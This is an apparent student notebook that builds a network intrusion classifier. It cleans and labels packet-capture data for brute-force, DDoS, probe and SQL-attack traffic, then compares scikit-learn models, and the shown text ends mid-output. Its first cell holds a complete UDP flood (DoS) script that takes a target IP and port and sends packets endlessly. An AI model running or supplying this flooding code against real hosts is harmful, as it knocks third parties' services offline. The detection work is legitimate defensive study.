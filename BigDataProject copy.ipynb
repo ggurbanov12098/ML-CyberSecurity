{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Example of DoS in Python"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import sys\n",
    "import time\n",
    "import socket\n",
    "import random\n",
    "from datetime import datetime\n",
    "\n",
    "now = datetime.now()\n",
    "hour = now.hour\n",
    "minute = now.minute\n",
    "day = now.day\n",
    "month = now.month\n",
    "year = now.year\n",
    "\n",
    "##############\n",
    "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n",
    "data = random._urandom(1490)\n",
    "#############\n",
    "\n",
    "os.system(\"clear\")\n",
    "os.system(\"Destroy DoS Attack\")\n",
    "print()\n",
    "print()\n",
    "ip = input(\"IP Target: \")\n",
    "port = int(input(\"Port: \"))\n",
    "\n",
    "os.system(\"clear\")\n",
    "os.system(\"Destroy DoS Attack Starting\")\n",
    "time.sleep(3)\n",
    "sent = 0\n",
    "try:\n",
    "    while True:\n",
    "        sock.sendto(data, (ip, port))\n",
    "        sent += 1\n",
    "        port += 1\n",
    "        print(\"Sent %s packet to %s through port: %s\" % (sent, ip, port))\n",
    "        if port == 65534:\n",
    "            port = 1\n",
    "except KeyboardInterrupt:\n",
    "    print(\"\\n[Ctrl+C] Attack stopped.\")\n",
    "    sys.exit()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# step1_cleanup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "## Command: python3 step1_cleanup.py label.csv\n",
    "\n",
    "import os\n",
    "import pandas as pd\n",
    "import ipaddress\n",
    "# from functools import reduce\n",
    "# import socket\n",
    "# import struct\n",
    "\n",
    "\n",
    "filename = \"BruteForceAzarin.csv\"\n",
    "csv_file_path = os.path.join(\"./\", filename)\n",
    "file1 = pd.read_csv(csv_file_path)\n",
    "file1.head(10)\n",
    "file1.isnull().sum\n",
    "#print(file1.isnull().sum)\n",
    "\n",
    "# ############### step-1 to replace all null ############################################################\n",
    "update_file = file1.fillna(\" \")\n",
    "update_file.isnull().sum()\n",
    "#print (update_file.isnull().sum()) \n",
    "update_file.to_csv('update_'+filename, index = False)\n",
    "\n",
    "# ############### step-2 to remove all rows with null value #############################################\n",
    "update_file = file1.fillna(0)\n",
    "#print (update_file.isnull().sum())\n",
    "\n",
    "# ############### step-3 to convert tcp.flag, ip.dst, ip.src to integer ##############################\n",
    "update_file['tcp.flags'] = update_file['tcp.flags'].apply(lambda x: int(str(x), 16))\n",
    "update_file['ip.dst'] = update_file['ip.dst'].apply(lambda x: int(ipaddress.IPv4Address(x)))\n",
    "update_file['ip.src'] = update_file['ip.src'].apply(lambda x: int(ipaddress.IPv4Address(x)))\n",
    "update_file.to_csv('update_'+filename, index = False)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# step2_labelling"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "## Command: python3 step2_labelling.py label updated_label.csv\n",
    "\n",
    "import os\n",
    "import csv\n",
    "\n",
    "label = \"bruteforce\" # LABEL NAME\n",
    "file_name = \"update_BruteFoce.csv\" # FILE NAME (in the same directory)\n",
    "\n",
    "csv_file_path = os.path.join(\"./\", file_name)\n",
    "file = open(csv_file_path)\n",
    "content = csv.reader(file)\n",
    "row0 = next(content)\n",
    "row0.append('label')\n",
    "all = []\n",
    "all.append(row0)\n",
    "for item in content:\n",
    "    item.append(label)\n",
    "    all.append(item)\n",
    "\n",
    "new_file = open(label+'_'+ file_name, 'w')\n",
    "writer = csv.writer(new_file, lineterminator='\\n')\n",
    "writer.writerows(all)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# step3_aggregate"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "New master dataset has been created: aggregated_master_dataset.csv\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import pandas as pd\n",
    "\n",
    "# Directory containing the labeled data\n",
    "data_directory = 'Labelled Data'\n",
    "\n",
    "# List of dataset files\n",
    "dataset_files = [\n",
    "    'benign_update_benign.csv',\n",
    "    'bruteforce_update_bruteforce.csv',\n",
    "    'ddos_update_ddos.csv',\n",
    "    'probe_update_nmap.csv',\n",
    "    'sqlattack_update_sqlattack.csv'\n",
    "]\n",
    "\n",
    "# Create an empty DataFrame to store the aggregated data\n",
    "master_dataset = pd.DataFrame()\n",
    "\n",
    "# Iterate through the dataset files and concatenate them\n",
    "for file in dataset_files:\n",
    "    file_path = os.path.join(data_directory, file)\n",
    "    df = pd.read_csv(file_path)\n",
    "    master_dataset = pd.concat([master_dataset, df], ignore_index=True)\n",
    "\n",
    "# Save the aggregated dataset to a new CSV file\n",
    "master_dataset.to_csv('aggregated_master_dataset.csv', index=False)\n",
    "\n",
    "print(\"New master dataset has been created: aggregated_master_dataset.csv\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# step4_train"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Load libraries\n",
    "import pandas\n",
    "\n",
    "# import matplotlib.pyplot as plt\n",
    "\n",
    "from sklearn import model_selection\n",
    "from sklearn.metrics import accuracy_score, confusion_matrix, classification_report\n",
    "\n",
    "from sklearn.linear_model import LogisticRegression\n",
    "from sklearn.tree import DecisionTreeClassifier\n",
    "from sklearn.neighbors import KNeighborsClassifier\n",
    "from sklearn.discriminant_analysis import LinearDiscriminantAnalysis\n",
    "\n",
    "from sklearn.naive_bayes import BernoulliNB       # Accuracy: 0.811730 (+/- 0.004672)\n",
    "# from sklearn.naive_bayes import GaussianNB      # Accuracy: 0.740240 (+/- 0.005949)\n",
    "# from sklearn.naive_bayes import ComplementNB    # Accuracy: 0.700330 (+/- 0.014145)\n",
    "# from sklearn.naive_bayes import CategoricalNB   # -\n",
    "# from sklearn.naive_bayes import MultinomialNB   # -\n",
    "\n",
    "\n",
    "# from pandas.plotting import scatter_matrix\n",
    "# import joblib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(num_of_rows, num_of_columns) = (71908, 27)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "dataset = pandas.read_csv(\"fillna_master_dataset.csv\")\n",
    "print(\"(num_of_rows, num_of_columns) = \" + str(dataset.shape) + '\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "label\n",
       "bruteforce     5090\n",
       "ipdos         66818\n",
       "dtype: int64"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataset.groupby('label').size()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>ip.src</th>\n",
       "      <th>ip.dst</th>\n",
       "      <th>ip.len</th>\n",
       "      <th>ip.flags.df</th>\n",
       "      <th>ip.flags.mf</th>\n",
       "      <th>ip.fragment</th>\n",
       "      <th>ip.fragment.count</th>\n",
       "      <th>ip.fragments</th>\n",
       "      <th>ip.ttl</th>\n",
       "      <th>ip.proto</th>\n",
       "      <th>...</th>\n",
       "      <th>tcp.flags</th>\n",
       "      <th>tcp.analysis.ack_rtt</th>\n",
       "      <th>tcp.segments</th>\n",
       "      <th>tcp.reassembled.length</th>\n",
       "      <th>http.request</th>\n",
       "      <th>udp.port</th>\n",
       "      <th>frame.time_relative</th>\n",
       "      <th>frame.time_delta</th>\n",
       "      <th>tcp.time_relative</th>\n",
       "      <th>tcp.time_delta</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>count</th>\n",
       "      <td>7.190800e+04</td>\n",
       "      <td>7.190800e+04</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>7.190800e+04</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.0</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>7.190800e+04</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.000000</td>\n",
       "      <td>71908.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>mean</th>\n",
       "      <td>2.678884e+09</td>\n",
       "      <td>1.711986e+08</td>\n",
       "      <td>733.385006</td>\n",
       "      <td>0.075611</td>\n",
       "      <td>0.463634</td>\n",
       "      <td>1.510859e+09</td>\n",
       "      <td>0.923346</td>\n",
       "      <td>461.211576</td>\n",
       "      <td>65.219572</td>\n",
       "      <td>17.233896</td>\n",
       "      <td>...</td>\n",
       "      <td>2.080978</td>\n",
       "      <td>0.000101</td>\n",
       "      <td>0.0</td>\n",
       "      <td>15.621836</td>\n",
       "      <td>0.004297</td>\n",
       "      <td>2.172056e+08</td>\n",
       "      <td>148.799851</td>\n",
       "      <td>0.035218</td>\n",
       "      <td>4.312999</td>\n",
       "      <td>0.225586</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>std</th>\n",
       "      <td>7.227645e+08</td>\n",
       "      <td>8.484526e+07</td>\n",
       "      <td>726.835701</td>\n",
       "      <td>0.264376</td>\n",
       "      <td>0.498679</td>\n",
       "      <td>2.133520e+09</td>\n",
       "      <td>0.997065</td>\n",
       "      <td>498.033830</td>\n",
       "      <td>12.099562</td>\n",
       "      <td>32.274483</td>\n",
       "      <td>...</td>\n",
       "      <td>13.710366</td>\n",
       "      <td>0.003825</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1537.440136</td>\n",
       "      <td>0.065412</td>\n",
       "      <td>2.342082e+08</td>\n",
       "      <td>396.056900</td>\n",
       "      <td>0.692247</td>\n",
       "      <td>61.059183</td>\n",
       "      <td>5.071146</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>min</th>\n",
       "      <td>0.000000e+00</td>\n",
       "      <td>0.000000e+00</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000e+00</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000e+00</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25%</th>\n",
       "      <td>2.886735e+09</td>\n",
       "      <td>1.684302e+08</td>\n",
       "      <td>38.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000e+00</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>63.000000</td>\n",
       "      <td>17.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000e+00</td>\n",
       "      <td>37.216750</td>\n",
       "      <td>0.000012</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50%</th>\n",
       "      <td>2.886735e+09</td>\n",
       "      <td>1.684302e+08</td>\n",
       "      <td>43.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000e+00</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>63.000000</td>\n",
       "      <td>17.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000e+00</td>\n",
       "      <td>47.618660</td>\n",
       "      <td>0.000058</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>75%</th>\n",
       "      <td>2.886735e+09</td>\n",
       "      <td>1.684302e+08</td>\n",
       "      <td>1500.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>3.063981e+09</td>\n",
       "      <td>2.000000</td>\n",
       "      <td>999.000000</td>\n",
       "      <td>63.000000</td>\n",
       "      <td>17.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>4.697820e+08</td>\n",
       "      <td>58.362749</td>\n",
       "      <td>0.000548</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>max</th>\n",
       "      <td>2.886735e+09</td>\n",
       "      <td>3.583847e+09</td>\n",
       "      <td>1500.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>6.670367e+09</td>\n",
       "      <td>2.000000</td>\n",
       "      <td>999.000000</td>\n",
       "      <td>128.000000</td>\n",
       "      <td>999.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>194.000000</td>\n",
       "      <td>0.897829</td>\n",
       "      <td>0.0</td>\n",
       "      <td>362923.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>4.697820e+08</td>\n",
       "      <td>2443.409215</td>\n",
       "      <td>28.570976</td>\n",
       "      <td>1676.286670</td>\n",
       "      <td>209.382183</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>8 rows × 26 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "             ip.src        ip.dst        ip.len   ip.flags.df   ip.flags.mf  \\\n",
       "count  7.190800e+04  7.190800e+04  71908.000000  71908.000000  71908.000000   \n",
       "mean   2.678884e+09  1.711986e+08    733.385006      0.075611      0.463634   \n",
       "std    7.227645e+08  8.484526e+07    726.835701      0.264376      0.498679   \n",
       "min    0.000000e+00  0.000000e+00      0.000000      0.000000      0.000000   \n",
       "25%    2.886735e+09  1.684302e+08     38.000000      0.000000      0.000000   \n",
       "50%    2.886735e+09  1.684302e+08     43.000000      0.000000      0.000000   \n",
       "75%    2.886735e+09  1.684302e+08   1500.000000      0.000000      1.000000   \n",
       "max    2.886735e+09  3.583847e+09   1500.000000      1.000000      1.000000   \n",
       "\n",
       "        ip.fragment  ip.fragment.count  ip.fragments        ip.ttl  \\\n",
       "count  7.190800e+04       71908.000000  71908.000000  71908.000000   \n",
       "mean   1.510859e+09           0.923346    461.211576     65.219572   \n",
       "std    2.133520e+09           0.997065    498.033830     12.099562   \n",
       "min    0.000000e+00           0.000000      0.000000      0.000000   \n",
       "25%    0.000000e+00           0.000000      0.000000     63.000000   \n",
       "50%    0.000000e+00           0.000000      0.000000     63.000000   \n",
       "75%    3.063981e+09           2.000000    999.000000     63.000000   \n",
       "max    6.670367e+09           2.000000    999.000000    128.000000   \n",
       "\n",
       "           ip.proto  ...     tcp.flags  tcp.analysis.ack_rtt  tcp.segments  \\\n",
       "count  71908.000000  ...  71908.000000          71908.000000       71908.0   \n",
       "mean      17.233896  ...      2.080978              0.000101           0.0   \n",
       "std       32.274483  ...     13.710366              0.003825           0.0   \n",
       "min        0.000000  ...      0.000000              0.000000           0.0   \n",
       "25%       17.000000  ...      0.000000              0.000000           0.0   \n",
       "50%       17.000000  ...      0.000000              0.000000           0.0   \n",
       "75%       17.000000  ...      0.000000              0.000000           0.0   \n",
       "max      999.000000  ...    194.000000              0.897829           0.0   \n",
       "\n",
       "       tcp.reassembled.length  http.request      udp.port  \\\n",
       "count            71908.000000  71908.000000  7.190800e+04   \n",
       "mean                15.621836      0.004297  2.172056e+08   \n",
       "std               1537.440136      0.065412  2.342082e+08   \n",
       "min                  0.000000      0.000000  0.000000e+00   \n",
       "25%                  0.000000      0.000000  0.000000e+00   \n",
       "50%                  0.000000      0.000000  0.000000e+00   \n",
       "75%                  0.000000      0.000000  4.697820e+08   \n",
       "max             362923.000000      1.000000  4.697820e+08   \n",
       "\n",
       "       frame.time_relative  frame.time_delta  tcp.time_relative  \\\n",
       "count         71908.000000      71908.000000       71908.000000   \n",
       "mean            148.799851          0.035218           4.312999   \n",
       "std             396.056900          0.692247          61.059183   \n",
       "min               0.000000          0.000000           0.000000   \n",
       "25%              37.216750          0.000012           0.000000   \n",
       "50%              47.618660          0.000058           0.000000   \n",
       "75%              58.362749          0.000548           0.000000   \n",
       "max            2443.409215         28.570976        1676.286670   \n",
       "\n",
       "       tcp.time_delta  \n",
       "count    71908.000000  \n",
       "mean         0.225586  \n",
       "std          5.071146  \n",
       "min          0.000000  \n",
       "25%          0.000000  \n",
       "50%          0.000000  \n",
       "75%          0.000000  \n",
       "max        209.382183  \n",
       "\n",
       "[8 rows x 26 columns]"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    " # class distribution\n",
    "# print(\"DESCRIPTIONS: \\n\" + str(dataset.describe()) + \"\\n\") # descriptions\n",
    "dataset.describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "################################# Split Dataset #################################\n",
    "array = dataset.values\n",
    "X = array[:,0:26]\n",
    "Y = array[:,26]\n",
    "\n",
    "# Split dataset into training set and test set\n",
    "X_train, X_validation, Y_train, Y_validation = model_selection.train_test_split(X, Y, test_size=0.3, random_state=42)\n",
    "X_train_set, X_test, Y_train_set, Y_test = model_selection.train_test_split(X_train, Y_train, test_size=0.4, random_state=42)   # second seperated train_test_split to \"play around\" for checking accuracy\n",
    "\n",
    "# X_train, X_test, Y_train, Y_test = model_selection.train_test_split(X, Y, test_size=0.2, random_state=42)\n",
    "# X_train, X_validation, Y_train, Y_validation = model_selection.train_test_split(X_train, Y_train, test_size=0.2, random_state=42)\n",
    "\n",
    "from sklearn.impute import SimpleImputer\n",
    "# Instantiate the imputer with a strategy to fill missing values (e.g., with the mean)\n",
    "imputer = SimpleImputer(strategy='mean')\n",
    "# Fit the imputer to the training data and transform the data\n",
    "X_train_imputed = imputer.fit_transform(X_train, Y_train)\n",
    "# Y_predict = X_train_imputed(X_test) \n",
    "# accuracy = accuracy_score(Y_validation, Y_predict)\n",
    "# Now you can use X_train_imputed for training your models\n",
    "\n",
    "# Evaluating algorithm model\n",
    "models = []\n",
    "models.append(('LR', LogisticRegression()))\n",
    "models.append(('NB', BernoulliNB()))\n",
    "# models.append(('LDA', LinearDiscriminantAnalysis()))\n",
    "# models.append(('KNN', KNeighborsClassifier())) #KNN vs ANN\n",
    "models.append(('CART', DecisionTreeClassifier()))\n",
    "\n",
    "# print(\"rows of metadata: \\n\" + str(array))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9950829442733684"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lr = LogisticRegression()\n",
    "lr.fit(X_train_imputed, Y_train)\n",
    "lr.score(X_test, Y_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "((50335, 26), (50335,))"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X_train_imputed.shape, Y_train.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/Destroy/anaconda3/lib/python3.11/site-packages/sklearn/linear_model/_logistic.py:460: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
      "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
      "\n",
      "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
      "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
      "Please also refer to the documentation for alternative solver options:\n",
      "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
      "  n_iter_i = _check_optimize_result(\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "LR Accuracy: 0.996166 (+/- 0.002046)\n",
      "NB Accuracy: 0.993881 (+/- 0.000755)\n",
      "LDA Accuracy: 0.999245 (+/- 0.000119)\n",
      "KNN Accuracy: 0.999781 (+/- 0.000020)\n",
      "CART Accuracy: 0.999762 (+/- 0.000119)\n"
     ]
    }
   ],
   "source": [
    "# Evaluate each model in turn\n",
    "results = []\n",
    "names = []\n",
    "for name, model in models:\n",
    "        kfold = model_selection.KFold(n_splits=2, shuffle=True, random_state=42)\n",
    "        cv_results = model_selection.cross_val_score(model, X_train_imputed, Y_train, cv=kfold, scoring='accuracy')\n",
    "        results.append(cv_results)\n",
    "        names.append(name)\n",
    "        message = \"%s Accuracy: %f (+/- %f)\" % (name, cv_results.mean(), cv_results.std())\n",
    "        print(message)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "ename": "NotFittedError",
     "evalue": "This LogisticRegression instance is not fitted yet. Call 'fit' with appropriate arguments before using this estimator.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNotFittedError\u001b[0m                            Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[11], line 1\u001b[0m\n\u001b[0;32m----> 1\u001b[0m models[\u001b[38;5;241m0\u001b[39m][\u001b[38;5;241m1\u001b[39m]\u001b[38;5;241m.\u001b[39mscore(X_test, Y_test)\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/sklearn/base.py:705\u001b[0m, in \u001b[0;36mClassifierMixin.score\u001b[0;34m(self, X, y, sample_weight)\u001b[0m\n\u001b[1;32m    680\u001b[0m \u001b[38;5;250m\u001b[39m\u001b[38;5;124;03m\"\"\"\u001b[39;00m\n\u001b[1;32m    681\u001b[0m \u001b[38;5;124;03mReturn the mean accuracy on the given test data and labels.\u001b[39;00m\n\u001b[1;32m    682\u001b[0m \n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m    701\u001b[0m \u001b[38;5;124;03m    Mean accuracy of ``self.predict(X)`` w.r.t. `y`.\u001b[39;00m\n\u001b[1;32m    702\u001b[0m \u001b[38;5;124;03m\"\"\"\u001b[39;00m\n\u001b[1;32m    703\u001b[0m \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01m.\u001b[39;00m\u001b[38;5;21;01mmetrics\u001b[39;00m \u001b[38;5;28;01mimport\u001b[39;00m accuracy_score\n\u001b[0;32m--> 705\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m accuracy_score(y, \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mpredict(X), sample_weight\u001b[38;5;241m=\u001b[39msample_weight)\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/sklearn/linear_model/_base.py:451\u001b[0m, in \u001b[0;36mLinearClassifierMixin.predict\u001b[0;34m(self, X)\u001b[0m\n\u001b[1;32m    437\u001b[0m \u001b[38;5;250m\u001b[39m\u001b[38;5;124;03m\"\"\"\u001b[39;00m\n\u001b[1;32m    438\u001b[0m \u001b[38;5;124;03mPredict class labels for samples in X.\u001b[39;00m\n\u001b[1;32m    439\u001b[0m \n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m    448\u001b[0m \u001b[38;5;124;03m    Vector containing the class labels for each sample.\u001b[39;00m\n\u001b[1;32m    449\u001b[0m \u001b[38;5;124;03m\"\"\"\u001b[39;00m\n\u001b[1;32m    450\u001b[0m xp, _ \u001b[38;5;241m=\u001b[39m get_namespace(X)\n\u001b[0;32m--> 451\u001b[0m scores \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mdecision_function(X)\n\u001b[1;32m    452\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mlen\u001b[39m(scores\u001b[38;5;241m.\u001b[39mshape) \u001b[38;5;241m==\u001b[39m \u001b[38;5;241m1\u001b[39m:\n\u001b[1;32m    453\u001b[0m     indices \u001b[38;5;241m=\u001b[39m xp\u001b[38;5;241m.\u001b[39mastype(scores \u001b[38;5;241m>\u001b[39m \u001b[38;5;241m0\u001b[39m, \u001b[38;5;28mint\u001b[39m)\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/sklearn/linear_model/_base.py:429\u001b[0m, in \u001b[0;36mLinearClassifierMixin.decision_function\u001b[0;34m(self, X)\u001b[0m\n\u001b[1;32m    410\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mdecision_function\u001b[39m(\u001b[38;5;28mself\u001b[39m, X):\n\u001b[1;32m    411\u001b[0m \u001b[38;5;250m    \u001b[39m\u001b[38;5;124;03m\"\"\"\u001b[39;00m\n\u001b[1;32m    412\u001b[0m \u001b[38;5;124;03m    Predict confidence scores for samples.\u001b[39;00m\n\u001b[1;32m    413\u001b[0m \n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m    427\u001b[0m \u001b[38;5;124;03m        this class would be predicted.\u001b[39;00m\n\u001b[1;32m    428\u001b[0m \u001b[38;5;124;03m    \"\"\"\u001b[39;00m\n\u001b[0;32m--> 429\u001b[0m     check_is_fitted(\u001b[38;5;28mself\u001b[39m)\n\u001b[1;32m    430\u001b[0m     xp, _ \u001b[38;5;241m=\u001b[39m get_namespace(X)\n\u001b[1;32m    432\u001b[0m     X \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_validate_data(X, accept_sparse\u001b[38;5;241m=\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mcsr\u001b[39m\u001b[38;5;124m\"\u001b[39m, reset\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mFalse\u001b[39;00m)\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/sklearn/utils/validation.py:1462\u001b[0m, in \u001b[0;36mcheck_is_fitted\u001b[0;34m(estimator, attributes, msg, all_or_any)\u001b[0m\n\u001b[1;32m   1459\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mTypeError\u001b[39;00m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;132;01m%s\u001b[39;00m\u001b[38;5;124m is not an estimator instance.\u001b[39m\u001b[38;5;124m\"\u001b[39m \u001b[38;5;241m%\u001b[39m (estimator))\n\u001b[1;32m   1461\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m _is_fitted(estimator, attributes, all_or_any):\n\u001b[0;32m-> 1462\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m NotFittedError(msg \u001b[38;5;241m%\u001b[39m {\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mname\u001b[39m\u001b[38;5;124m\"\u001b[39m: \u001b[38;5;28mtype\u001b[39m(estimator)\u001b[38;5;241m.\u001b[39m\u001b[38;5;18m__name__\u001b[39m})\n",
      "\u001b[0;31mNotFittedError\u001b[0m: This LogisticRegression instance is not fitted yet. Call 'fit' with appropriate arguments before using this estimator."
     ]
    }
   ],
   "source": [
    "models[0][1].score(X_test, Y_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "\n",
    "#Compare Algorithms\n",
    "fig = plt.figure()\n",
    "fig.suptitle('Algorithm Comparison')\n",
    "ax = fig.add_subplot(111)\n",
    "plt.boxplot(results)\n",
    "ax.set_xticklabels(names)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CART accuracy test: 0.978963348514422\n"
